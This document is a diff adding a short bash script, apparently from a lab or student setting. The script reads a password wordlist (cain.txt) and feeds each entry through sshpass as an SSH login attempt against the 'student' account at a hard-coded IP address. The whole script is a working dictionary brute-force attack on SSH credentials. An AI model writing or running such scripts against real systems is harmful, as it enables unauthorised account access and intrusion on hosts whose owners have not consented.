@@ -1,0 +1,10 @@
+#!/bin/bash
+
+        for line in $(cat /home/david/bin/cain.txt)
+
+        do
+        echo "$line"
+sshpass -p $line ssh student@147.232.22.134
+
+        done
+
